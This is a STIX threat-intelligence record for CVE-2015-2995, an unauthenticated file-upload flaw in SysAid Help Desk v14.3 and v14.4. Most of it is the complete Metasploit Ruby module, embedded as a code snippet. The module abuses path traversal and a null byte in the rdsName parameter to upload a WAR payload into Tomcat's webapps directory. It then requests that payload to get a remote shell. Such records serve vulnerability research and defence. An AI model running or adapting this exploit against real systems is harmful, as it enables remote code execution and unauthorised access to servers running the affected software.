{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8abdfab6-187b-45cf-a39c-9387cd68a9e0",
    "created": "2024-08-14T17:07:26.316274Z",
    "modified": "2024-08-14T17:07:26.316278Z",
    "name": "\"SysAid Help Desk rdslogs Arbitrary File Upload\"",
    "description": " This module exploits a file upload vulnerability in SysAid Help Desk v14.3 and v14.4. The vulnerability exists in the RdsLogsEntry servlet which accepts unauthenticated file uploads and handles zip file contents in an insecure way. By combining both weaknesses a remote attacker can accomplish remote code execution. Note that this will only work if the target is running Java 6 or 7 up to 7u25, as Java 7u40 and above introduces a protection against null byte injection in file names. This module has been tested successfully on version v14.3.12 b22 and v14.4.32 b25 in Linux. In theory this module also works on Windows, but SysAid seems to bundle Java 7u40 and above with the Windows package which prevents the vulnerability from being exploited. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/sysaid_rdslogs_file_upload.rb",
            "external_id": "sysaid_rdslogs_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2995"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Jun/8"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => \"SysAid Help Desk 'rdslogs' Arbitrary File Upload\",\n      'Description' => %q{\n        This module exploits a file upload vulnerability in SysAid Help Desk v14.3 and v14.4.\n        The vulnerability exists in the RdsLogsEntry servlet which accepts unauthenticated\n        file uploads and handles zip file contents in an insecure way. By combining both weaknesses,\n        a remote attacker can accomplish remote code execution. Note that this will only work if the\n        target is running Java 6 or 7 up to 7u25, as Java 7u40 and above introduces a protection\n        against null byte injection in file names. This module has been tested successfully on version\n        v14.3.12 b22 and v14.4.32 b25 in Linux. In theory this module also works on Windows, but SysAid\n        seems to bundle Java 7u40 and above with the Windows package which prevents the vulnerability\n        from being exploited.\n      },\n      'Author'       =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2015-2995' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2015/Jun/8' ]\n        ],\n      'DefaultOptions' => { 'WfsDelay' => 30 },\n      'Privileged'  => false,\n      'Platform'    => 'java',\n      'Arch'        => ARCH_JAVA,\n      'Targets'     =>\n        [\n          [ 'SysAid Help Desk v14.3 - 14.4 / Java Universal', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-06-03'))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI',\n          [true, 'Base path to the SysAid application', '/sysaid/'])\n      ])\n  end\n\n\n  def check\n    servlet_path = 'rdslogs'\n    bogus_file = rand_text_alphanumeric(4 + rand(32 - 4))\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], servlet_path),\n      'method' => 'POST',\n      'vars_get' => {\n        'rdsName' => bogus_file\n      }\n    })\n\n    if res && res.code == 200\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n\n  def send_payload(war_payload, tomcat_path, app_base)\n    # We have to use the Zlib deflate routine as the Metasploit Zip API seems to fail\n    print_status(\"Uploading WAR file...\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'rdslogs'),\n      'method' => 'POST',\n      'data' => Zlib::Deflate.deflate(war_payload),\n      'ctype' => 'application/octet-stream',\n      'vars_get' => {\n        'rdsName' => \"../../../../#{tomcat_path}#{app_base}.war\\x00\"\n      }\n    })\n\n    # The server either returns a 200 OK when the upload is successful.\n    if res && res.code == 200\n      print_good(\"Upload appears to have been successful, waiting for deployment\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - WAR upload failed\")\n    end\n  end\n\n\n  def exploit\n    # We need to create the upload directories before our first attempt to upload the WAR.\n    print_status(\"Creating upload directory\")\n    bogus_file = rand_text_alphanumeric(4 + rand(32 - 4))\n    send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'rdslogs'),\n      'method' => 'POST',\n      'data' => Zlib::Deflate.deflate(rand_text_alphanumeric(4 + rand(32 - 4))),\n      'ctype' => 'application/xml',\n      'vars_get' => {\n        'rdsName' => bogus_file\n      }\n    })\n\n    app_base = rand_text_alphanumeric(4 + rand(32 - 4))\n    war_payload = payload.encoded_war({ :app_name => app_base }).to_s\n\n    send_payload(war_payload, 'tomcat/webapps/', app_base)\n    register_files_for_cleanup(\"tomcat/webapps/#{app_base}.war\")\n\n    10.times do\n      select(nil, nil, nil, 2)\n\n      # Now make a request to trigger the newly deployed war\n      print_status(\"Attempting to launch payload in deployed WAR...\")\n      res = send_request_cgi({\n        'uri'    => normalize_uri(app_base, Rex::Text.rand_text_alpha(rand(8)+8)),\n        'method' => 'GET'\n      })\n      # Failure. The request timed out or the server went away.\n      break if res.nil?\n      # Success! Triggered the payload, should have a shell incoming\n      return if res.code == 200\n    end\n    print_error(\"Failed to launch payload. Trying one last time with a different path...\")\n\n    # OK this might be a Linux server, it's a different traversal path.\n    # Let's try again...\n    send_payload(war_payload, '', app_base)\n    register_files_for_cleanup(\"webapps/#{app_base}.war\")\n\n    10.times do\n      select(nil, nil, nil, 2)\n\n      # Now make a request to trigger the newly deployed war\n      print_status(\"Attempting to launch payload in deployed WAR...\")\n      res = send_request_cgi({\n        'uri'    => normalize_uri(app_base, Rex::Text.rand_text_alpha(rand(8)+8)),\n        'method' => 'GET'\n      })\n      # Failure. The request timed out or the server went away.\n      break if res.nil?\n      # Success! Triggered the payload, should have a shell incoming\n      break if res.code == 200\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-06-03",
    "x_mitre_platforms": [
        "java'"
    ]
}